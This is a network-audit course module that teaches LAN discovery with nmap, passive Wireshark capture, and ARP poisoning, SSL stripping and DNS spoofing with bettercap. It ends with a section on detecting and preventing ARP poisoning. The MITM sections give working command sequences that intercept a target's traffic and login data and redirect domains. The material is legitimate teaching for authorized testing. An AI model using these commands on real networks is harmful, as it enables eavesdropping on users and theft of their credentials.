# Module 37 — WiFi Network Audit & ARP Analysis

> **Scope:** Authorized use on networks you own or have written permission to test.
> Everything here is standard blue team / network administration work.

---

## 1. How a LAN Actually Works

When your device joins a WiFi network it gets an IP like `192.168.1.45`.
But IP is Layer 3. To actually send a packet to another device, the OS
needs to know its **MAC address** (Layer 2 hardware address).

```
You want to send to 192.168.1.1 (the router)
→ OS checks ARP cache: do I know the MAC for 192.168.1.1?
→ If not: broadcasts "WHO HAS 192.168.1.1?"  (ARP Request)
→ Router replies: "I have it, my MAC is AA:BB:CC:DD:EE:FF"  (ARP Reply)
→ Now your OS sends the Ethernet frame directly to AA:BB:CC:DD:EE:FF
```

This is the **Address Resolution Protocol (ARP)**. It has no authentication —
any device can answer any ARP request with any MAC address. That's the
root cause of ARP poisoning.

---

## 2. Network Layers You'll Work With

```
Layer 7  Application   HTTP, HTTPS, DNS, SMB — what users actually do
Layer 4  Transport     TCP, UDP — ports and sessions
Layer 3  Network       IP addresses — routing between networks
Layer 2  Data Link     MAC addresses — who is who on this LAN segment
Layer 1  Physical      WiFi radio / Ethernet cable
```

As a network auditor you'll work at all these layers:
- **Layer 2** → ARP scanning, device discovery, ARP poisoning
- **Layer 3** → IP scanning, routing, traceroute
- **Layer 4** → Port scanning, service detection
- **Layer 7** → Traffic inspection, DNS monitoring, HTTP capture

---

## 3. Tools You Need

Install these before starting exercises:

| Tool | Purpose | Install |
|------|---------|---------|
| **nmap** | Network scanner | https://nmap.org/download.html |
| **Wireshark** | Packet capture + GUI analysis | https://www.wireshark.org/download.html |
| **bettercap** | Modern ARP/MITM framework | https://www.bettercap.org/installation/ |
| **arpspoof** (optional) | Legacy ARP poisoning (part of dsniff) | via Linux only |
| **Npcap** | Windows packet capture driver (Wireshark installs it) | auto with Wireshark |

> For Windows: nmap + Wireshark + bettercap covers everything.
> For Linux (Kali/Parrot): all tools available via `apt`.

---

## 4. Phase 1 — Network Discovery

### 4.1 Find your own IP and subnet

**Windows:**
```cmd
ipconfig /all
```
Look for your WiFi adapter. Note:
- IPv4 Address: `192.168.1.45` (your IP)
- Subnet Mask: `255.255.255.0` → means your subnet is `192.168.1.0/24`
- Default Gateway: `192.168.1.1` (the router)
- DNS Servers: what DNS your device uses

**Linux:**
```bash
ip addr show
ip route show
```

### 4.2 Discover all live devices (ping sweep)

```bash
# nmap ping sweep — finds all responding devices
nmap -sn 192.168.1.0/24

# Faster version using ARP (requires root/admin)
nmap -sn -PR 192.168.1.0/24

# Save output to file
nmap -sn 192.168.1.0/24 -oN live_hosts.txt
```

Output:
```
Nmap scan report for 192.168.1.1
Host is up (0.0042s latency).
MAC Address: A8:9C:ED:AA:11:22 (TP-Link Technologies)

Nmap scan report for 192.168.1.23
Host is up (0.011s latency).
MAC Address: 3C:06:30:BB:CC:DD (Apple)
```

MAC vendor prefix tells you the device type:
- `Apple` → MacBook, iPhone, iPad
- `Samsung` → Android phone or Smart TV
- `TP-Link`, `Netgear`, `Asus` → Router/access point
- `Espressif` → IoT devices, cheap smart devices
- `Raspberry Pi` → Pi devices

### 4.3 Find Smart TVs, IP cameras, IoT devices

```bash
# Scan for common IoT/media ports
nmap -p 80,443,554,8080,8443,1935,7547,8888,9999 192.168.1.0/24

# Port meanings:
# 554  = RTSP (IP camera live stream)
# 8080 = HTTP alternate (smart TV control, DVR web UI)
# 7547 = TR-069 (ISP router management — never expose this)
# 1935 = RTMP (media streaming)
# 9999 = Commonly used by cheap IoT/cameras

# Detect OS and services (more detailed, slower)
nmap -A 192.168.1.0/24

# Run UPnP discovery (finds smart TVs, media servers)
nmap --script=upnp-info 192.168.1.0/24

# Find all cameras specifically
nmap -p 554 --open 192.168.1.0/24
```

### 4.4 Check open ports on a specific device

```bash
# Full port scan on one device
nmap -p- -T4 192.168.1.55

# Service + version detection
nmap -sV -p 1-1000 192.168.1.55

# Aggressive: OS + service + scripts
nmap -A 192.168.1.55
```

---

## 5. Phase 2 — Passive Traffic Monitoring (No Interception)

Before active attacks, passive monitoring is safer and already reveals a lot.

### 5.1 Capture traffic with Wireshark

1. Open Wireshark
2. Select your WiFi adapter
3. Start capture

Key filters to use in Wireshark:

```
# See all DNS queries (what domains everyone is looking up)
dns

# See HTTP traffic (unencrypted)
http

# See ARP traffic (device discovery + ARP activity)
arp

# See traffic from/to a specific device
ip.addr == 192.168.1.55

# See TCP connections being made
tcp.flags.syn == 1 and tcp.flags.ack == 0

# See DHCP (who just joined the network)
dhcp
```

### 5.2 What passive capture gives you

On a switched WiFi network (WPA2), passive capture from your device will
mostly show:
- **Broadcast/multicast traffic** — ARP, mDNS, SSDP (UPnP)
- **Your own traffic** — everything you send/receive
- **Unencrypted DNS** — if the router/AP doesn't encrypt DNS internally

You will NOT passively see other devices' unicast traffic unless:
- You're on a hub (not a switch) — rare
- The AP has some misconfiguration
- You perform ARP poisoning (Phase 3)

### 5.3 DNS monitoring via bettercap (passive)

```bash
# Start bettercap on your interface
bettercap -iface eth0   # or WiFi adapter name

# Inside bettercap console — just listen to DNS
net.probe on
net.sniff on
set net.sniff.verbose true
set net.sniff.filter udp port 53
```

This shows DNS queries being broadcast on the LAN.

---

## 6. Phase 3 — ARP Poisoning (Active MITM)

> **Requires written authorization on company networks.**
> This is a standard red team / network pen test technique.

### 6.1 How ARP poisoning works

Normal state:
```
Device (192.168.1.45)  →  Router (192.168.1.1)
Device's ARP cache: 192.168.1.1 = AA:BB:CC:DD:EE:FF  ← real router MAC
```

After ARP poisoning:
```
Your machine sends fake ARP replies to the target device:
"192.168.1.1 is at YOUR-MAC-ADDRESS"

Device's ARP cache now:
192.168.1.1 = YOUR-MAC  ← points to your machine, not the router

All traffic from device → your machine → router (you're in the middle)
```

You also poison the router:
```
"192.168.1.45 is at YOUR-MAC-ADDRESS"
Router now sends responses to you, not the real device.
```

Your machine must forward the traffic (IP forwarding) so the victim
doesn't notice the connection drop.

### 6.2 Step-by-step ARP poisoning with bettercap (Windows/Linux)

**Step 1 — Enable IP forwarding so traffic keeps flowing**

Windows:
```cmd
# Enable IP routing (run as admin)
reg add HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f
# Then restart the Routing and Remote Access service or reboot
```

Linux:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# Persistent:
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
```

**Step 2 — Start bettercap**

```bash
# Windows (run as Administrator)
bettercap.exe -iface "Wi-Fi"

# Linux
sudo bettercap -iface wlan0
```

**Step 3 — Discover the network**

Inside bettercap console:
```
net.probe on
# Wait 10-15 seconds while it scans
net.show
# Lists all discovered devices with IP + MAC + hostname
```

**Step 4 — Set up ARP poisoning against a target**

```
# Poison a specific target (e.g. 192.168.1.55)
set arp.spoof.targets 192.168.1.55
arp.spoof on

# Poison ALL devices on the network (broadcast MITM)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Confirm it's running
arp.spoof.status
```

**Step 5 — Start sniffing traffic**

```
net.sniff on
set net.sniff.verbose true

# Filter by protocol
set net.sniff.filter tcp port 80   # HTTP only
set net.sniff.filter udp port 53   # DNS only
```

**Step 6 — Watch what you capture**

You'll now see the target's traffic flowing through your machine:
- **DNS queries** — every domain they visit
- **HTTP requests** — full URLs, headers, sometimes POST data (login forms on HTTP sites)
- **HTTPS** — you'll see the destination IP and TLS SNI (hostname) but not content

**Step 7 — Stop and clean up (important)**

```
arp.spoof off
net.sniff off
exit
```

ARP caches restore within 1-2 minutes automatically. Always stop cleanly.

### 6.3 HTTPS interception with SSL stripping (advanced)

When a user visits `https://example.com` you can try SSL stripping:
- Your MITM intercepts the initial HTTP redirect to HTTPS
- Serves them HTTP instead of upgrading
- You see the unencrypted HTTP traffic

```
# In bettercap
set https.proxy.sslstrip true
https.proxy on
```

**Limitations:**
- HSTS (HTTP Strict Transport Security) defeats this for major sites
- Chrome/Firefox warn on certificate issues
- Most corporate traffic uses HSTS — this catches misconfigured internal apps

For full HTTPS inspection on **company-owned devices**, use Module 28
(TLS MITM Proxy with corporate CA cert deployed to devices).

---

## 7. Phase 4 — DNS Hijacking

Once you're the MITM, you can also intercept and modify DNS responses.

### 7.1 Redirect a domain to your machine

```
# In bettercap
set dns.spoof.domains example.com,internal.company.com
set dns.spoof.address 192.168.1.100   # your IP
dns.spoof on
```

Now when any poisoned device looks up `example.com`, they get your IP.
Use case: testing whether employees will connect to a fake login page
(phishing simulation — see Scenario 01 in company-scenarios).

### 7.2 Log all DNS queries

```
# bettercap — log every DNS query to file
set net.sniff.output dns_log.pcap
net.sniff on
```

Or in Wireshark: `File → Export Specified Packets` with filter `dns`.

---

## 8. Phase 5 — Blue Team: Detecting ARP Poisoning

This is the defensive side. You should know how to detect the attack
you just learned to run.

### 8.1 Manual check

```cmd
# Windows: view your ARP cache
arp -a

# Look for: two different IPs with the SAME MAC address
# Normal:
# 192.168.1.1    AA-BB-CC-DD-EE-FF   dynamic   ← router
# 192.168.1.22   11-22-33-44-55-66   dynamic   ← device

# Poisoned:
# 192.168.1.1    AA-BB-CC-DD-EE-FF   dynamic   ← router
# 192.168.1.55   AA-BB-CC-DD-EE-FF   dynamic   ← SAME MAC = attacker in the middle
```

### 8.2 Automated detection

The C++ tool in this module (`arp_monitor.cpp`) does this continuously.

### 8.3 Prevention

| Method | How it works | Where to configure |
|--------|-------------|-------------------|
| Dynamic ARP Inspection (DAI) | Managed switch validates ARP against DHCP leases | Cisco/HP managed switches |
| Static ARP entries | Router IP → MAC hardcoded, can't be spoofed | `arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF` |
| 802.1X port auth | Devices must authenticate to get LAN access | RADIUS server + managed switch |
| XArp / arpwatch | Monitor for ARP anomalies | arpwatch on Linux, XArp on Windows |

---

## 9. Summary: What Each Phase Reveals

| Phase | Technique | What you learn |
|-------|-----------|----------------|
| Ping sweep | `nmap -sn` | How many devices, MAC vendors |
| Port scan | `nmap -A` | What services run on each device |
| Passive sniff | Wireshark | Your traffic + broadcasts + DNS leaks |
| ARP poison | bettercap | Full traffic of target device |
| DNS spoof | bettercap dns.spoof | Redirect any domain |
| SSL strip | bettercap sslstrip | Intercept HTTP-downgraded HTTPS |
| ARP monitor | arp_monitor.cpp | Detect if someone is poisoning YOUR network |

---

## Exercises

- `exercise_01_discovery.md` — network scan, find all devices and IoT
- `exercise_02_passive_sniff.md` — Wireshark filters, DNS monitoring
- `exercise_03_arp_poison.md` — full MITM setup, capture target traffic
- `exercise_04_detection.cpp` — write an ARP anomaly detector

## Workable Tool

`arp_monitor.cpp` — standalone ARP cache monitor that alerts on poisoning
